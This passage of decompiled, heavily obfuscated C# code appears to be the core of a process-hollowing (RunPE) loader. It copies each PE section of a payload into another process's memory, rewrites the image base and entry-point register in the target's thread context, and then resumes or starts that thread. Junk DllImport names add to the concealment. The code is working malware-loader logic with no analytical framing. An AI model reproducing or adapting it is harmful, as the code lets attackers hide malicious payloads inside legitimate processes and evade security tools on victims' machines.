						*unchecked((int*)((byte*)ptr + 3396)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 3400)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 3404)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[4447] = ((*(int*)((byte*)ptr + 3400) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4447] != 0)
					{
						byte[] array282;
						checked
						{
							array282 = new byte[*unchecked((int*)((byte*)ptr + 3400)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 3404), array282, 0, array282.Length);
						((byte*)ptr)[4448] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 3396))), array282, array282.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[4448] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[4452] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4452] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 3408)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 3412)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 3416)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[4450] = ((*(int*)((byte*)ptr + 3412) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4450] != 0)
					{
						byte[] array283;
						checked
						{
							array283 = new byte[*unchecked((int*)((byte*)ptr + 3412)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 3416), array283, 0, array283.Length);
						((byte*)ptr)[4451] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 3408))), array283, array283.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[4451] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[4455] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4455] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 3420)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 3424)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 3428)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[4453] = ((*(int*)((byte*)ptr + 3424) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4453] != 0)
					{
						byte[] array284;
						checked
						{
							array284 = new byte[*unchecked((int*)((byte*)ptr + 3424)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 3428), array284, 0, array284.Length);
						((byte*)ptr)[4454] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 3420))), array284, array284.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[4454] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[4458] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4458] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 3432)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 3436)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 3440)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[4456] = ((*(int*)((byte*)ptr + 3436) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4456] != 0)
					{
						byte[] array285;
						checked
						{
							array285 = new byte[*unchecked((int*)((byte*)ptr + 3436)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 3440), array285, 0, array285.Length);
						((byte*)ptr)[4457] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 3432))), array285, array285.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[4457] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[4461] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4461] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 3444)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 3448)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 3452)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[4459] = ((*(int*)((byte*)ptr + 3448) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4459] != 0)
					{
						byte[] array286;
						checked
						{
							array286 = new byte[*unchecked((int*)((byte*)ptr + 3448)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 3452), array286, 0, array286.Length);
						((byte*)ptr)[4460] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 3444))), array286, array286.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[4460] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[4464] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4464] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 3456)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 3460)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 3464)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[4462] = ((*(int*)((byte*)ptr + 3460) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4462] != 0)
					{
						byte[] array287;
						checked
						{
							array287 = new byte[*unchecked((int*)((byte*)ptr + 3460)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 3464), array287, 0, array287.Length);
						((byte*)ptr)[4463] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 3456))), array287, array287.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[4463] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[4467] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4467] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 3468)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 3472)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 3476)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[4465] = ((*(int*)((byte*)ptr + 3472) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4465] != 0)
					{
						byte[] array288;
						checked
						{
							array288 = new byte[*unchecked((int*)((byte*)ptr + 3472)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 3476), array288, 0, array288.Length);
						((byte*)ptr)[4466] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 3468))), array288, array288.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[4466] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[4470] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4470] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 3480)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 3484)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 3488)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[4468] = ((*(int*)((byte*)ptr + 3484) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4468] != 0)
					{
						byte[] array289;
						checked
						{
							array289 = new byte[*unchecked((int*)((byte*)ptr + 3484)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 3488), array289, 0, array289.Length);
						((byte*)ptr)[4469] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 3480))), array289, array289.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[4469] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[4473] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4473] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 3492)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 3496)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 3500)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[4471] = ((*(int*)((byte*)ptr + 3496) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4471] != 0)
					{
						byte[] array290;
						checked
						{
							array290 = new byte[*unchecked((int*)((byte*)ptr + 3496)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 3500), array290, 0, array290.Length);
						((byte*)ptr)[4472] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 3492))), array290, array290.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[4472] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[4476] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4476] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 3504)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 3508)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 3512)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[4474] = ((*(int*)((byte*)ptr + 3508) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4474] != 0)
					{
						byte[] array291;
						checked
						{
							array291 = new byte[*unchecked((int*)((byte*)ptr + 3508)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 3512), array291, 0, array291.Length);
						((byte*)ptr)[4475] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 3504))), array291, array291.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[4475] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[4479] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4479] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 3516)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 3520)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 3524)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[4477] = ((*(int*)((byte*)ptr + 3520) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4477] != 0)
					{
						byte[] array292;
						checked
						{
							array292 = new byte[*unchecked((int*)((byte*)ptr + 3520)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 3524), array292, 0, array292.Length);
						((byte*)ptr)[4478] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 3516))), array292, array292.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[4478] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[4482] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4482] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 3528)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 3532)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 3536)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[4480] = ((*(int*)((byte*)ptr + 3532) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4480] != 0)
					{
						byte[] array293;
						checked
						{
							array293 = new byte[*unchecked((int*)((byte*)ptr + 3532)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 3536), array293, 0, array293.Length);
						((byte*)ptr)[4481] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 3528))), array293, array293.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[4481] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[4485] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4485] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 3540)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 3544)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 3548)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[4483] = ((*(int*)((byte*)ptr + 3544) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4483] != 0)
					{
						byte[] array294;
						checked
						{
							array294 = new byte[*unchecked((int*)((byte*)ptr + 3544)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 3548), array294, 0, array294.Length);
						((byte*)ptr)[4484] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 3540))), array294, array294.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[4484] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[4488] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4488] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 3552)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 3556)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 3560)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[4486] = ((*(int*)((byte*)ptr + 3556) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4486] != 0)
					{
						byte[] array295;
						checked
						{
							array295 = new byte[*unchecked((int*)((byte*)ptr + 3556)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 3560), array295, 0, array295.Length);
						((byte*)ptr)[4487] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 3552))), array295, array295.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[4487] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[4491] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4491] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 3564)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 3568)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 3572)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[4489] = ((*(int*)((byte*)ptr + 3568) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4489] != 0)
					{
						byte[] array296;
						checked
						{
							array296 = new byte[*unchecked((int*)((byte*)ptr + 3568)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 3572), array296, 0, array296.Length);
						((byte*)ptr)[4490] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 3564))), array296, array296.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[4490] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[4494] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4494] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 3576)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 3580)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 3584)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[4492] = ((*(int*)((byte*)ptr + 3580) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4492] != 0)
					{
						byte[] array297;
						checked
						{
							array297 = new byte[*unchecked((int*)((byte*)ptr + 3580)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 3584), array297, 0, array297.Length);
						((byte*)ptr)[4493] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 3576))), array297, array297.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[4493] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
			}
			byte[] bytes = BitConverter.GetBytes(CS_0024_003C_003E8__locals0.int_0);
			((byte*)ptr)[4496] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(*unchecked((int*)((byte*)ptr + 20)) + 8), bytes, 4, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
			if (((byte*)ptr)[4496] != 0)
			{
				throw new Exception();
			}
			*(int*)((byte*)ptr + 44) = BitConverter.ToInt32(array, checked(*unchecked((int*)((byte*)ptr + 12)) + 40));
			((byte*)ptr)[4497] = ((byte*)ptr)[3601];
			if (((byte*)ptr)[4497] != 0)
			{
				CS_0024_003C_003E8__locals0.int_0 = *(int*)((byte*)ptr + 16);
			}
			checked
			{
				array2[44] = CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 44));
			}
			((byte*)ptr)[4498] = (((ulong)delegate5(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_1, array2) > 0uL) ? ((byte)1) : ((byte)0));
			if (((byte*)ptr)[4498] != 0)
			{
				throw new Exception();
			}
			((byte*)ptr)[4499] = ((byte*)ptr)[3600];
			if (((byte*)ptr)[4499] != 0)
			{
				new Thread((ThreadStart)delegate
				{
					Thread.CurrentThread.IsBackground = true;
					smethod_1(CS_0024_003C_003E8__locals0.class5_0.struct0_0, checked((uint)CS_0024_003C_003E8__locals0.int_0), CS_0024_003C_003E8__locals0.int_1);
				}).Start();
				*(int*)((byte*)ptr + 3588) = 10;
			}
			else
			{
				*(int*)((byte*)ptr + 3592) = 0;
				((byte*)ptr)[4500] = ((delegate8(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_1, out *(uint*)((byte*)ptr + 3592)) == -1) ? ((byte)1) : ((byte)0));
				if (((byte*)ptr)[4500] != 0)
				{
					throw new Exception();
				}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			((byte*)ptr)[3598] = 0;
			ProjectData.ClearProjectError();
			goto IL_154ae;
		}
		Thread.Sleep(100);
		((byte*)ptr)[3598] = 1;
		goto IL_154ae;
		IL_154ae:
		return ((byte*)ptr)[3598] != 0;
	}

	[DllImport("dfddddddfll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern long DhcpDeRegisterParamChange(int int_0, [MarshalAs(UnmanagedType.AnsiBStr)] ref string string_0);

	[DllImport("fff.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern long d(long long_0, long long_1, ref bool bool_0);
}
